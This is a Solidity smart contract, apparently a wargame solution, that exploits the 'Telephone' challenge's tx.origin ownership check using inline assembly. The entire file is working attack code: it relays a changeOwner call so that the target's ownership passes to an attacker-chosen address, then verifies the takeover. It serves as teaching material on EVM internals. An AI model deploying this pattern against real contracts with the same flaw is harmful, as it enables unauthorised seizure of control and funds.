// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/**
 * @title TelephoneAssemblyAttack
 * @notice Pure assembly implementation of the Telephone exploit
 * @dev Every function uses inline assembly for maximum EVM learning
 * @author obingo31
 * @custom:date 2025-10-20
 * FOR EDUCATIONAL PURPOSES ONLY
 */
contract TelephoneAssemblyAttack {
    // Storage layout (slots):
    // 0: owner
    // 1: targetContract
    
    event ExploitInitiated(address indexed target);
    event OwnershipClaimed(address indexed target, address indexed newOwner);
    event ExploitCompleted(address indexed target, address indexed newOwner);

    /**
     * @notice Constructor - Pure assembly implementation
     */
    constructor() {
        assembly {
            // Store msg.sender as owner at slot 0
            sstore(0, caller())
        }
    }

    /**
     * @notice Set target Telephone contract using pure assembly
     * @param target The Telephone contract address
     */
    function setTarget(address target) external {
        assembly {
            // Only owner can set target
            if iszero(eq(caller(), sload(0))) {
                revert(0, 0)
            }
            
            // Store target contract address (slot 1)
            sstore(1, target)
            
            // Emit ExploitInitiated event
            // Event signature: ExploitInitiated(address)
            mstore(0x00, target)
            log1(0x00, 0x20, 0x55ffe1743a11276c05c071933b9c3311fd9bac876dbc4532cd2107f2aad5ef78)
        }
    }

    /**
     * @notice Execute the exploit using pure assembly
     * @param newOwner Address to become the new owner of target contract
     * 
     * Attack Mechanism:
     * When this function is called by a user (EOA):
     *   1. User calls: attack(newOwner)
     *      - tx.origin  = User's address
     *      - msg.sender = User's address
     *   
     *   2. This contract calls: target.changeOwner(newOwner)
     *      - tx.origin  = User's address (unchanged!)
     *      - msg.sender = This contract's address
     *   
     *   3. In Telephone contract's changeOwner():
     *      - Checks: tx.origin != msg.sender
     *      - User != This contract ✅ (condition passes!)
     *      - Ownership changed!
     */
    function attack(address newOwner) external {
        assembly {
            // Only owner can execute attack
            if iszero(eq(caller(), sload(0))) {
                revert(0, 0)
            }
            
            // Load target contract address
            let target := sload(1)
            
            // Ensure target is set
            if iszero(target) {
                // Revert with "Target not set"
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 14)
                mstore(add(ptr, 0x44), "Target not set")
                revert(ptr, 0x64)
            }
            
            // ════════════════════════════════════════════════════════
            // Calculate function selector for changeOwner(address)
            // ════════════════════════════════════════════════════════
            
            // Method: Store signature, hash it, overwrite with hash
            mstore(0, "changeOwner(address)")
            mstore(0, keccak256(0, 20))
            
            // Now memory at 0x00 contains full hash
            // First 4 bytes = selector (0xa6f9dae1)
            
            // ════════════════════════════════════════════════════════
            // Prepare calldata
            // ════════════════════════════════════════════════════════
            
            // Selector already at 0x00 (first 4 bytes of hash)
            // Add parameter at 0x04
            mstore(0x04, newOwner)
            
            // ════════════════════════════════════════════════════════
            // Execute the call
            // ════════════════════════════════════════════════════════
            
            // Call target.changeOwner(newOwner)
            let success := call(
                gas(),          // Forward all gas
                target,         // Target address
                0,              // No ETH sent
                0,              // Input data at memory 0
                0x24,           // Input size: 4 (selector) + 32 (address) = 36 bytes
                0,              // Output location
                0               // Output size
            )
            
            if iszero(success) {
                // Revert if attack failed
                let errPtr := mload(0x40)
                mstore(errPtr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(errPtr, 0x04), 0x20)
                mstore(add(errPtr, 0x24), 13)
                mstore(add(errPtr, 0x44), "Attack failed")
                revert(errPtr, 0x64)
            }
            
            // ════════════════════════════════════════════════════════
            // Emit success event
            // ════════════════════════════════════════════════════════
            
            // Emit OwnershipClaimed event
            mstore(0x00, target)
            mstore(0x20, newOwner)
            log1(
                0x00,
                0x40,
                0x935c51778db70bb63d01ba9b319c9b8f13d608e43d550a91d8896bd1368857df
            )
        }
    }

    /**
     * @notice Verify exploit success by checking target owner using pure assembly
     * @return success True if exploit succeeded
     * @return currentOwner Current owner of target contract
     */
    function verifyExploit() external view returns (bool success, address currentOwner) {
        assembly {
            // Load target contract address
            let target := sload(1)
            
            if iszero(target) {
                // Return (false, address(0)) if no target set
                mstore(0x00, 0)
                mstore(0x20, 0)
                return(0x00, 0x40)
            }
            
            // ════════════════════════════════════════════════════════
            // Calculate selector for owner()
            // ════════════════════════════════════════════════════════
            
            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            
            // ════════════════════════════════════════════════════════
            // Static call to get owner
            // ════════════════════════════════════════════════════════
            
            let callSuccess := staticcall(
                gas(),          // Forward all gas
                target,         // Target address
                0,              // Input at memory 0 (selector)
                4,              // Input size: 4 bytes
                0,              // Output at memory 0
                0x20            // Output size: 32 bytes
            )
            
            if callSuccess {
                currentOwner := mload(0)
                success := 1
            }
            
            // Return both values
            mstore(0x00, success)
            mstore(0x20, currentOwner)
            return(0x00, 0x40)
        }
    }

    /**
     * @notice Demonstrate tx.origin vs msg.sender in assembly
     * @return txOrigin The transaction origin (original caller)
     * @return msgSender The message sender (immediate caller)
     */
    function demonstrateTxOrigin() external view returns (
        address txOrigin,
        address msgSender
    ) {
        assembly {
            // ORIGIN opcode (0x32) - returns tx.origin
            // This is the ORIGINAL external account that started the transaction
            // It NEVER changes throughout the call chain
            txOrigin := origin()
            
            // CALLER opcode (0x33) - returns msg.sender  
            // This is the IMMEDIATE caller of the current function
            // It CHANGES with each call in the chain
            msgSender := caller()
        }
    }

    /**
     * @notice Get target contract address using pure assembly
     * @return target The target contract address
     */
    function getTarget() external view returns (address target) {
        assembly {
            target := sload(1)
        }
    }

    /**
     * @notice Get owner address using pure assembly
     * @return ownerAddr The owner address
     */
    function getOwner() external view returns (address ownerAddr) {
        assembly {
            ownerAddr := sload(0)
        }
    }

    /**
     * @notice Compute function selector using pure assembly (educational utility)
     * @param functionSig Function signature string
     * @return selector The 4-byte function selector
     * 
     * Example usage:
     *   computeSelector("changeOwner(address)") => 0xa6f9dae1
     *   computeSelector("owner()") => 0x8da5cb5b
     */
    function computeSelector(string calldata functionSig) external pure returns (bytes4 selector) {
        assembly {
            // Copy function signature to memory
            let sigLength := functionSig.length
            let sigPtr := mload(0x40)
            calldatacopy(sigPtr, functionSig.offset, sigLength)
            
            // Hash the signature
            let hash := keccak256(sigPtr, sigLength)
            
            // Extract first 4 bytes as selector
            // Method 1: Using AND mask
            selector := and(hash, 0xffffffff00000000000000000000000000000000000000000000000000000000)
            
            // Method 2: Using SHR (shift right) - alternative approach
            // selector := shl(224, shr(224, hash))
        }
    }

    /**
     * @notice Get owner of any contract using pure assembly
     * @param contractAddr The contract to query
     * @return ownerAddr The owner of the contract
     */
    function getOwnerOf(address contractAddr) external view returns (address ownerAddr) {
        assembly {
            // Calculate selector for owner()
            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            
            // Static call to get owner
            let success := staticcall(
                gas(),
                contractAddr,
                0,      // Input at 0
                4,      // 4 bytes
                0,      // Output at 0
                0x20    // 32 bytes
            )
            
            if iszero(success) {
                revert(0, 0)
            }
            
            ownerAddr := mload(0)
        }
    }
}